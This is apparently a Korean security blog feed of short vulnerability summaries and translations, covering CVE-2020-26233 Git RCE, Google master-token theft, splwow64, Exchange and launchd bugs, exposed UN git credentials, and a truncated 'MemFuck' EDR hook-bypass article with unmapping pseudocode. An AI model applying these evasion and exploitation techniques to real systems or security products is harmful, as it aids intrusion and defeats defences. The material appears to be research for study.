class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION</span></span><span class="hljs-class">&#123;</span>    USHORT NumberOfTargets;    USHORT Reserved;    ULONG Reserved2;    PPROCESS_DYNAMIC_EH_CONTINUATION_TARGET* Targets;&#125; PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION, *PPROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION;</code></pre><p><code>PspProcessDynamicEHContinuationTargets</code> 함수가 이 데이터를 반복하기 위해 호출되며, 이 시점에서 <code>RtlAddDynamicEHContinuationTarget</code>은 대상 주소를 저장하는 데이터 구조를 할당하고 <code>ETL_RB_TREE_BPROCESS.NODE</code>에 <code>RTL_RB_NODE</code> 링크를 연결하는 <code>DYNAMIC_EH_CONTINUATION_TARGET_ADD</code> 플래그 세트를 포함하는 항목에 대해 호출되며 반대로 플래그가 없으면 대상을 조회하고 실제로 존재하는 경우 제거되고 노드가 해제된다. 각 항목이 처리될 때 <code>DYNAMIC_EH_CONTINUATION_TARGET_PROCESSED</code> 플래그가 원래 입력 버퍼에 OR 처리되므로 호출자는 어떤 항목이 작동하고 작동하지 않았는지 알 수 있다.</p><p>가능한 모든 ROP 가젯이 단순히 ‘동적 연속 목표’로 추가될 수 있으므로이 기능의 존재는 CET/CFG와 유사한 기능의 보편적인 우회로 보인다. 그러나 Microsoft는 브라우저와 Flash에 대한 <code>out-of-process JIT</code> 컴파일만 공식적으로 지원하므로 이 API는 원격 프로세스에서만 작동한다는 점에 유의해야 한다. 따라서 현재 프로세스에서 호출하면 항상 <code>STATUS_ACCESS_DENIED</code>로 실패한다.</p><h2 id="타겟-검증"><a href="#타겟-검증" class="headerlink" title="타겟 검증"></a>타겟 검증</h2><p>이 모든 지식을 통합하면 <code>RtlVerifyUserUnwindTarget</code> 함수를 설명하기 쉬워진다.</p><ol><li>CONTEXT_EX 구조에서 대상 RIP와 연관된 로드된 PE 모듈을 조회한다. 먼저 <code>RtlpLookupUserFunctionTableInverted</code>를 사용하고 실패하면 대신 <code>MmGetImageBase</code>를 사용하여 모듈이 4GB 미만인지 확인한다.</li><li>모듈이 발견되면 <code>LdrImageDirectoryEntryToLoadConfig</code> 함수를 호출하여 Image Load Configuration Directory를 가져온다. 그런 다음 Long Jump 또는 연속 대상에 대한 동적 예외 핸들러 테이블을 포함할 수 있을 만큼 충분히 큰지와 <code>guardflags</code>에 <code>IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT</code> 또는 <code>IMAGE_GUARD_EH_CONTINUATION_TABLE_PRESENT</code>가 포함되어 있는지 확인한다. 디렉터리가 없거나 너무 작은 경우 혹은 일치하는 테이블이 없는 경우 호환성을 위해 <code>STATUS_SUCCESS</code>를 반환한다.</li><li>Image Load Configuration Directory에서 <code>GuardLongJumpTargetTable</code> 또는 <code>GuardEHContinuationTable</code>을 가져오고 <code>GuardLongJumpTargetCount</code> 또는 <code>GuardEHContinuationCount</code>의 유효성을 검사한다. 항목이 40억 개 이상이면 <code>STATUS_INTEGER_OVERFLOW</code>를 반환한다. 0 개 이상의 항목이 있는 경우 테이블을 통해 bsearch_s (대조자로 <code>RtlpTarget Compare</code> 를 전달)를 사용하여 binary search를 통해 RVA로 변환한 후 대상 RIP를 찾는다. 발견되면 <code>STATUS_SUCCESS</code>를 반환합니다.</li><li>대상 RIP를 찾을 수 없거나 (또는 테이블에 시작할 항목이 0인 경우) 처음부터 대상 RIP에서 로드된 모듈이 발견되지 않은 경우 <code>STATUS_SET_CONTEXT_DENIED</code>를 반환해  <code>longjmp</code> 유효성을 검증한다.(<code>KCONTINUE_LONGJUMP</code>)</li><li>예외 해제 유효성 검사 (<code>KCONTINUE_UNWIND</code>)의 경우 <code>RtlpFindDynamicEHContinuationTarget</code>을 호출하여 등록된 연속 대상에 대한 동적 예외 핸들러인지 확인한다. 맞으면 <code>STATUS_SUCCESS</code>를 반환하고, 그렇지 않으면 <code>STATUS_SET_CONTEXT_DENIED</code>를 반환한다.</li></ol><h1 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h1><p>CET의 구현과 관련 mitigation은 ROP 및 기타 제어 흐름 하이재킹 기술의 사용을 방지하기 위한 주요 단계이다. 제어 흐름 무결성은 분명 복잡한 주제이며, 향후 추가적인 mitigation이 추가됨에 따라 더욱 복잡해질 것이다. 추가적인 호환성 문제와 일회성 시나리오로 인해 특정 처리를 필요로 하는 사례가 점점 더 많이 발견될 수 있다. 그러나 완화 기술, 특히 많은 새로운 기능을 포함하는 기술의 발전단계에는 문제가 발생하기 마련이고, 우리는 이 분야에서 더 많은 연구가 이루어짐에 따라 미래에 흥미로운 것들이 발견될 것이라고 확신한다.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>rop</tag>
      
      <tag>L0ch</tag>
      
      <tag>cet</tag>
      
      <tag>mitigation</tag>
      
      <tag>translation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-26233: Git CLI RCE</title>
    <link href="/2021/01/16/fabu1ous/2021-01-16/"/>
    <url>/2021/01/16/fabu1ous/2021-01-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/">https://blog.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git Credential Manager core &lt; 2.0.289</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>악성 repository를 fork 한 피해자의 시스템에 임의의 실행파일을 실행시킬 수 있는 CVE-2020-26233에 대한 세부 정보가 공개되었습니다. 유사한 취약점으로 <a href="https://hackyboiz.github.io/2020/11/06/l0ch/2020-11-06/">CVE-2020-27955</a>가 있습니다.</p><p>git clone은 기본적으로 top-level 디렉터리를 clone 한 후 새로운 git 프로세스를 생성해 재귀적으로 submodule들을 clone 합니다. 만약 repository의 root디렉터리 안에 git.exe라는 이름의 실행파일이 있다면 Git Credential Manager core가 configuration을 읽는 과정에서 해당 파일을 실행하게 됩니다.</p><p>이런 취약점이 발생하는 이유는 다음과 같습니다. 만약 git.exe를 실행하라는 명령어를 받으면 Windows는 우선적으로 현재 디렉터리에 git.exe 실행파일이 있는지 확인하고, 없을 때만 %PATH% 환경 변수를 순회하면서 git.exe를 찾아 실행합니다. </p><p>PoC는 아래와 같습니다.</p><ol><li>새로운 Repository생성, 혹은 기존 Repository에 파일 추가할 수 있는 권한 획득</li><li>windows 실행파일의 파일명을 git.exe로 수정해 업로드</li><li>임의의 사용자가 Repository를 fork 하기를 기다림</li><li>RCE 성공</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Google master token 탈취를 통한 구글 계정 접근</title>
    <link href="/2021/01/15/l0ch/2021-01-15/"/>
    <url>/2021/01/15/l0ch/2021-01-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.usejournal.com/how-i-stole-the-data-in-millions-of-peoples-google-accounts-aa1b72dcc075">How I stole the data in millions of people’s Google accounts</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android/iOS<br>Google accounts</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>피싱 앱에서 해커가 Google의 계정과 패스워드를 탈취하는 방법은 일반적으로 앱에서 <code>Google 계정으로 가입</code> 버튼을 통해 해커가 제작한 로그인 페이지에 계정과 패스워드를 입력하도록 유도하는 방법입니다.</p><p>Google은 이전에 로그인한 지역과 거리가 먼 지역에서 로그인 시도가 있을 경우 이를 차단하는 위치 기반 로그인 차단 기능이 있어 해커가 계정과 패스워드를 알아도 피해자의 계정에 접근할 수 없습니다. 그러나 안드로이드 기기의 구글 계정 관리 토큰인 Google master token을 탈취하면 이러한 계정 보호를 우회할 수 있습니다. master token은 사용자가 암호나 2단계 로그인 설정을 변경하지 않는 이상 만료되지 않고 위치 검사의 대상이 아니기 때문에 위치 기반 로그인 차단이 작동하지 않습니다. </p><p>피해자가 해커의 악성 앱을 설치하고 구글 계정으로 가입하도록 유도하면 구글 로그인 페이지를 통해 피해자 계정의 master token을 가져올 수 있고 해커는 이 master token으로 대부분의 구글 서비스에 접근이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>google credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-1648: CVE-2020-0986 패치 우회 및 arbitrary address read</title>
    <link href="/2021/01/14/idioth/2021-01-14/"/>
    <url>/2021/01/14/idioth/2021-01-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://whereisk0shl.top/post/the_story_of_cve_2021_1648">THE STORY OF CVE-2021-1648</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows splwow64</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2021년 1월 patch tuesday에서 <a href="https://hackyboiz.github.io/2020/12/31/idioth/2020-12-31/">CVE-2020-0986</a> 패치를 우회하는 splwow64 서비스 취약점을 패치했습니다.  CVE-2020-0986이 패치된 후 splwow64와 gdi32full에는 두 가지 검사가 추가되었습니다.</p><ol><li>프린터 핸들 검사 함수 <code>FindDriverForCookie</code>와 <code>FindPrinterHandle</code> 추가</li><li>포인터 유효성 검사를 위한 함수 <code>UMPDStringPointerFromOffset</code>과 <code>UMPDPointerFromOffset</code> 추가</li></ol><p>1번의 함수들은 전역 변수에 어떤 프린터 드라이버 핸들이 저장되었는지 확인합니다. 그중 <code>0x6A</code> 커맨드를 호출하면 함수 <code>bAddPrinterHandle</code>가 전역 변수 <code>qword_1800EABA0</code>에 저장된 드라이버 힙에 프린트 핸들을 추가하여 전역 변수에 프린터 핸들 값을 조작해 <code>0x6D</code>에서 호출하는 <code>FindDriverForCookie</code>와 <code>FindPrinterHandle</code>을 우회할 수 있습니다. 또한 <code>0x6D</code>에서 <code>memcpy</code>를 호출할 때 source address를 확인하지 않고 복사를 진행하여 arbitrary address read가 가능합니다.</p><p>2번 함수들은 잘못된 범위 검사로 인해 우회가 가능합니다. splwow64는 x86에 대한 호환성으로 인해 항상 32비트 힙을 할당합니다. 하지만 두 함수들은 offset과 portview+offset이 <code>0x7fffffff</code>보다 작은지만 검사합니다. splwow64에서 힙은 낮은 주소에 할당되므로(ex. <code>0x7d7c70</code>) 검사를 우회할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>information disclosure</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16875: RCE in MS Office 365</title>
    <link href="/2021/01/13/fabu1ous/2021-01-13/"/>
    <url>/2021/01/13/fabu1ous/2021-01-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html">https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Exchange server released Before 09/08/2020</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft office 365 Exchange server에서 발견된 CVE-2020-16875의 write-up이 공개되었습니다. <code>New-DlpPolicy</code> cmdlet의 validation 작업을 하는  <code>NewDlpPolicy.InternalValidate()</code> 함수에서 유저로부터 받은 TemplateData를  pipeline에 추가한 후 Powershell command로 실행하기 때문에 code injection취약점이 존재합니다. 이를 악용할 경우 SYSTEM권한으로 원격 코드 실행을 할 수 있습니다.</p><p> <code>NewDlpPolicy.InternalValidate()</code>가 호출하는 <code>DlpPolicyTemplateMetaData.ValidateCmdletParameters()</code> 함수는 다음과 같이 패치되었습니다. </p><ol><li>Inline command 사용을 막기 위한 검사 수행</li><li>validate 하려는 command 문자열이  <code>New-TransportRule</code>로 시작하는지 검사</li><li>validate 하려는 command 문자열이 <code>-DlpPolicy</code>을 담고 있는지 검사</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs">https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs</a>.</p><p><a href="https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps">https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>office 365</tag>
      
      <tag>exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-9971 : macOS/iOS XPC 서비스 관리 앱에서 발견된 권한 상승 취약점</title>
    <link href="/2021/01/12/l0ch/2021-01-12/"/>
    <url>/2021/01/12/l0ch/2021-01-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xlab.tencent.com/en/2021/01/11/cve-2020-9971-abusing-xpc-service-to-elevate-privilege/">CVE-2020-9971 Abusing XPC Service mechanism to elevate privilege in macOS/iOS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>macOS &lt; Big Sur<br>iOS  &lt; 13.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>launchd는 macOS에서 <code>inetd</code>, <code>xinted</code>를 대체하는 서비스 관리 데몬입니다.<br>이러한 <code>launchd</code> 애플리케이션에서 프로세스 간 통신 프로토콜을 제공하는 XPC 서비스를 관리할 때 권한 상승이 가능한 취약점의 세부 정보가 공개되었습니다.</p><p><code>launchd</code>는 <code>launchd process domain</code> 을 통해 XPC 서비스를 지정된 프로세스로 제한할 수 있으며 프로세스 도메인은 소유자 프로세스만 수정이 가능합니다. 그러나 Big Sur 이전의 <code>launchd</code>에서 프로세스 도메인에 XPC를 추가할 때 호출자 pid와 프로세스 도메인의 소유자 pid를 확인하지 않아 프로세스가 다른 임의의 프로세스에 XPC 서비스를 추가할 수 있습니다.</p><p>해당 취약점을 악용하면 해커의 프로세스(애플리케이션)가 루트 권한으로 실행되는 프로세스의 도메인에 임의의 사용자 지정 XPC 서비스를 추가할 수 있고, 추가된 XPC 서비스가 루트 권한으로 실행됩니다.</p><p>iOS 또한 macOS와 동일한 <code>launchd</code> 로직을 사용하고 있으며 iOS 13.5 이전 버전에 같은 취약점이 존재합니다. 애플은 호출자 pid가 대상 프로세스 도메인의 소유자인지 확인하는 코드를 추가해 해당 취약점을 패치했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>ios</tag>
      
      <tag>L0ch</tag>
      
      <tag>apple</tag>
      
      <tag>macos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 유엔환경계획(UNEP) 10만명 이상 직원 기록 접근</title>
    <link href="/2021/01/11/idioth/2021-01-11/"/>
    <url>/2021/01/11/idioth/2021-01-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://johnjhacking.com/blog/unep-breach/">UNEP Breached, 100K+ Employee Records Accessed</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ilo.org</li><li>unep.org</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>유엔에서 Git Credentials이 노출된 endpoint를 통해 직원들의 기록 및 프로젝트, 보고서 등의 정보에 접근할 수 있는 취약점이 발견되었습니다. ilo.org의 하위 도메인에 노출된 .git content가 존재합니다. <a href="https://github.com/arthaud/git-dumper">git-dumper</a>를 사용하여 프로젝트 폴더를 덤프할 수 있고 코드에 노출된 자격 증명으로 mysql 데이터베이스와 survey management platform에 접근할 수 있습니다.</p><p><img src="/2021/01/11/idioth/2021-01-11/image0.png"></p><p>또한 unep.org에서  <code>.git-credentials</code>가 노출된 서브 도메인이 존재합니다. GitHub credentials를 통해 private project에 접근할 수 있고 데이터베이스 및 각종 애플리케이션 정보에 접근할 수 있습니다.</p><p><img src="/2021/01/11/idioth/2021-01-11/image1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>git dump</tag>
      
      <tag>git credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] MeMFuck: 유저 모드 후킹 우회</title>
    <link href="/2021/01/10/idioth/memfuck/"/>
    <url>/2021/01/10/idioth/memfuck/</url>
    
    <content type="html"><![CDATA[<blockquote><p>원문 글 : <a href="https://winternl.com/memfuck/">MemFuck: Bypassing User-Mode Hooks</a></p></blockquote><h2 id="서문"><a href="#서문" class="headerlink" title="서문"></a>서문</h2><p>동적 악성코드 분석은 많은 AV/EDR/MDS에서 악성 프로그램을 탐지하는데 자주 사용하는 방식이다. 동적 분석은 정적 분석과 달리 실행 과정에서 만들어진 윈도우 API 호출을 캡처하고 분석하며 정적 분석보다 탐지율이 높다. system call을 캡처하는  많은 기술이 있지만 가장 많이 사용하는 것은 user-level hook이다. 이러한 hook은 악성 기능을 분석하기 위해 함수 호출을 가로챈다. 임의 실행 파일에서 API 호출의 시퀀스는 다음과 같다.</p><pre><code class="hljs ebnf"><span class="hljs-attribute">OpenProcess</span><span class="hljs-attribute">VirtualAllocEx</span><span class="hljs-attribute">WriteProcessMemory</span><span class="hljs-attribute">CreateRemoteThreadEx</span><span class="hljs-attribute">QueueUserAPC</span><span class="hljs-attribute">NtAlertResumeThread</span></code></pre><p>안티 바이러스들은 호출이나 그 조합을 기반으로 악성 행위를 정의한다. 안티 바이러스의 입장에서 특정한 호출 조합은 코드 인젝션이며 대부분 악의적이거나 원하지 않는 행동으로 판단된다.</p><p>user-mode hook은 안티 바이러스와 NGAV, EDR, sandbox, anti-cheat, DRM 등을 포함한 많은 보안 제품과 툴에서 사용된다. user-mode hook은 구현하기 쉽고, 안정적이고, 간단하며 성능 오버헤드가 적다.</p><p>대부분 user-land hook은 inline hook이며 control flow를 custom handler로 리다이렉트 시키기 위한 대상 함수 rewrite를 포함한다. 핸들러의 내부에서 파라미터들은 보존되고 요청된 함수를 실행하거나 분석할지 결정할 수 있다. 이것들은 잘 문서화되어 있으므로 이러한 개념에 익숙할 것이라고 가정할 것이다.</p><h2 id="32-bit-Hooks"><a href="#32-bit-Hooks" class="headerlink" title="32-bit Hooks"></a>32-bit Hooks</h2><p><img src="/2021/01/10/idioth/memfuck/image0.png"></p><p>32비트 user-land hook이 포함된다. 32비트 유저 모드 보안 제품은 대부분 가능한 깊은 위치에서 hook 하며 ntdll에 대부분의 의심스러운 함수들(NtQueueApcThread 등)이 존재한다. 해결 방법은 system call을 사용하여 원하는 기능을 직접적으로 호출하는 것이다. Ring3 후킹으로 모든 보안 제품을 우회할 수 있다.</p><p>필자는 5년 동안 32비트 윈도우를 접한 경우가 하나도 없으므로 일반적인 경우인 WoW64에서 동작하는 32비트 응용 프로그램에 대해 살펴볼 것이다.</p><h2 id="WoW64에서의-32비트-후킹"><a href="#WoW64에서의-32비트-후킹" class="headerlink" title="WoW64에서의 32비트 후킹"></a>WoW64에서의 32비트 후킹</h2><p><img src="/2021/01/10/idioth/memfuck/image1.png"></p><p>가장 흔한 악성코드의 인스턴스는 Wow64에서 동작하는 32비트 프로그램이다(64비트 머신에서 동작). NGAV와 EDR은 이러한 시나리오에서의 hook 구현이 미흡하다. 대부분 보안 제품은 x86 유저 모드 영역에서만 hook을 한다. user-mode hook을 활용하는 안티바이러스는 WoW64 layer에 hook을 위치하는 것이 좋지만 모든 업체가 그것을 구현하지는 않는다. <a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">Sophos 우회에 관한 MDSec의 게시글</a>을 보아라.</p><p>많은 보안 제품들이 32비트 프로세스에서 WoW64 실행을 모니터링하지 않는다는 사실은 오랫동안 알려져 있었고 <a href="https://blog.malwarebytes.com/threat-analysis/2018/01/a-coin-miner-with-a-heavens-gate/">악성코드 제작자</a>와 <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">red-team</a>에 의해 공격당했다. 필자가 분석한 악성코드 중에 얼마나 많은 것들이 이를 악용한 <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf’s wow64ext</a>를 포함하는지 말할 수 없다.</p><h2 id="요약-기존-기술"><a href="#요약-기존-기술" class="headerlink" title="요약 : 기존 기술"></a>요약 : 기존 기술</h2><ul><li>단순히 함수의 Ntdll 버전을 호출하는 것</li><li><a href="https://web.archive.org/web/20190407064851/https://blog.ensilo.com/globeimposter-ransomware-technical">함수의 Wow64 버전을 호출하는 것</a></li><li><a href="https://cdn2.hubspot.net/hubfs/487909/ENSILO%20WHITEPAPER%20ENTER%20THE%20DARK%20GATE.pdf">직접 Syscall 호출</a></li><li>원본 thunk 추적 (<a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">FireWalker</a>)</li><li><a href="https://blog.malwarebytes.com/threat-analysis/2018/03/hancitor-fileless-attack-with-a-copy-trick/">보조 DLL 매핑</a></li><li>Code splicing (byte stealing)</li></ul><p>모두 잘 작동하고 좋지만 64비트 버전의 ntdll에 위치한 hook에서 동작하지 않을 수 있다. 필자의 관찰에서 이러한 레벨의 hook은 어떤 public 코드로도 본 적이 없고 어떤 안티바이러스도 구현하지 않았다. 몇 가지 존재할 것이라고 확신하지만 보지 못했다.</p><h2 id="MemFuck에-들어가며"><a href="#MemFuck에-들어가며" class="headerlink" title="MemFuck에 들어가며"></a>MemFuck에 들어가며</h2><p>Memfuck은 오직 PoC이며 production code와 유사하지 않다. 즉 필자는 유저 영역에서 가능한 강력한 anti-analysis 기술이라고 생각한다.</p><p>MemFuck은 다른 anti-analysis 방법으로 실험을 시작했다. 본질적으로 가능한 한 비어있는 프로세스를 생성하길 원했으므로 DLL이나 쉘 코드의 수정 없이 보안 제품을 attach 할 수 없었다. 필자는 2008년에 이 <a href="https://gynvael.coldwind.pl/?id=93">게시글</a>을 발견했는데 매우 흥미로웠다. 물론 32비트 윈도우 XP에서 많은 변화가 있었으므로 많은 코드가 호환되지 않지만 대부분의 개념이 존재한다.</p><p><img src="/2021/01/10/idioth/memfuck/image2.png"></p><p>무엇이 ntdll을 필요로 하는가? 모든 결과는 특정한 DLL에 의존하므로 이를 망쳐버리면 어떠한 일이 일어날까</p><h2 id="Unmap-Everything"><a href="#Unmap-Everything" class="headerlink" title="Unmap Everything"></a>Unmap Everything</h2><p>MemFuck은 32비트 주소 영역에서 가능한 모든 것을 unmap 하는 것에 의해 시작된다. 물론 PEB/PEB64, TEB/TEB64와 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data">KUSER_SHARED_DATA</a> (작년에 마침내 문서화되었다) 같이 해제가 불가능한 것들도 있다. 이에 대해 몇 가지 방법이 있지만 가능한 귀찮지 않은 방법을 선택하고 싶었다. 우리는 모든 것에 NtUnmapViewOfSection을 호출하는 x86 쉘 코드를 할당할 수 있지만 그렇게 ntdll을 unmap 하면 무슨 일이 일어날까? Ntdll은 자기 자신을 unmap 할 수 없으므로 이 방법은 동작하지 않는다. 다음 단계에서 필자는 code segment switching(Heaven’s Gate)을 통해 직접 syscall 호출을 시험해보았다. 32비트 주소 영역에서 64비트 syscall 실행은 충분히 가능하지만 이 방법은 몇 가지 이유로 이상적이지 않았다.</p><ul><li>32비트 주소 영역에서 코드가 매핑되고 실행되므로 분석하기 쉬울 것이다.</li><li>64비트 주소 영역은 여전히 손상되어 있지 않다.</li><li>이 기술은 user-mode hook을 우회하기 효과적이지만 이미 문서화되어 있다.</li></ul><p>전부는 아니지만 대부분 Ring3 hook을 활용하는 AV/EDR 업체들은 하나의 일반적인 가정을 한다고 생각한다. WoW64 위에서 실행하는 32비트 프로세스는 4GB로 제한된 주소 아래에서 사용자 정의된 코드를 가진다. 따라서 매핑되지 않은 코드를 더 많이 배치하고 기능을 계속할 수 있는 이 제한 이상의 메모리를 할당해보자. Alex Ionescu에 따르면 <a href="https://twitter.com/aionescu/status/677599528409677824?lang=en">이것은 가능하지 않다</a>. 그러나 Petr Benes와 얘기한 후 그는 최근 버전의 윈도우10에서 이러한 제한이 해제되었다고 생각한다. 윈도우10 Build 19041.508에서 테스트했다.</p><p>64비트 버전의 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a> 호출하기 위해 <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf’s wow64ext</a>를 사용했다. 필자가 처음 호출을 시도했을 때 혼란스러운 결과를 봤다. BaseAddress 요청이 Null이면 운영체제가 메모리 할당할 위치를 결정한다. 물론 윈도우는 우리가 있어서는 안 되는 곳에 메모리를 할당하는 것을 원하지 않으며 64비트 호출은 32비트 주소 영역에 잘 할당된 메모리를 반환한다. ZeroBit 플래그를 망치는 것은 어떨까? 필자는 ZeroBit 플래그를 조작해서 가능한 높은 주소에 request 하는 방법을 설명하는 <a href="https://stackoverflow.com/questions/50429365/what-is-the-most-reliable-portable-way-to-allocate-memory-at-low-addresses-on">stackoverflow 게시글</a>을 찾았다. 다시 필자는 ZeroBit 플래그를 조작하여 64비트 NtAllocateVirtual request에 MEM_TOP_DOWN 플래그를 추가해보았다. 메모리가 살짝 높긴 하지만 32비트 주소를 만났다. 이 지점에서 매개변수를 조작하는 아이디어를 얻었다. 우리가 원하는 주소를 요청하자! 필자는 BaseAddress를 64비트 주소(많은 메모리와 3개의 DLL)로 설정했고 놀랍게도 그 주소에 할당됐다.</p><p><img src="/2021/01/10/idioth/memfuck/image3.png"></p><p>물론 여기서 우리가 첫 번째로 해야 할 것은 여기에 쉘 코드를 써서 어떠한 행동이 일어나는지 보는 것이다. <a href="https://github.com/jackullrich/ShellcodeStdio">ShellcodeStdio</a>를 사용해서 빠르고 쉽게 64비트 쉘 코드를 작성했다. 이 쉘 코드는 64비트 공간에 할당되고 쓰이며 기본적으로 32비트 유저 모드의 모든 것에 unmap을 시도한다.</p><p>첫 번째 시도에 대한 수도 코드는 아래와 같다.</p><pre><code class="hljs cpp">DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtUnmapViewOfSection);DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtProtectVirtualMemory);<span class="hljs-keyword">for</span> (DWORD m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">0x80000000</span>; m += <span class="hljs-number">0x1000</span>)    &#123;      PVOID ptrToProtect = (PVOID)m;      ULONG dwBytesToProtect = <span class="hljs-number">1</span>;      ULONG dwOldProt = <span class="hljs-number">0</span>;      NtProtectVirtualMemory((HANDLE)<span class="hljs-number">-1</span>, &amp;ptrToProtect, &amp;dwBytesToProtect, PAGE_READWRITE, &amp;dwOldProt);      NtUnmapViewOfSection((HANDLE)<span class="hljs-number">-1</span>, (PVOID)m);    &#125;</code></pre><p><img src="/2021/01/10/idioth/memfuck/image4.png"></p><p>프로세스가 엉망이다. 그러나 여전히 코드는 실행되고 있으며 잘 동작하고 있다. anti-analysis을 하기에 상당히 좋은 환경이다. 32비트 주소 영역의 완전한 제어를 갖고 우리가 원하는 것을 확실히 로드하고 언로드 할 수 있다. OllyDbg와 x64dbg 같은 많은 디버거들은 여기서 크래시가 나서 분석을 계속하기 위해 Windbg를 사용했다.</p><h2 id="An-Interstring-Intermission"><a href="#An-Interstring-Intermission" class="headerlink" title="An Interstring Intermission"></a>An Interstring Intermission</h2><p>프로세스의 32비트 주소 영역을 완전히 지워버리면서 코드는 의도대로 실행하고 동작하도록 하는 목표에 거의 성공했었다. 여기에는 공격적인 결과와 방어적인 결과가 같이 있다. 아마 이 기간 동안 가장 흥미로운 사실 중 하나는 <a href="https://docs.microsoft.com/en-us/windows/win32/winprog64/exception-handling-under-wow64">MSDN 페이지</a>를 발견했을 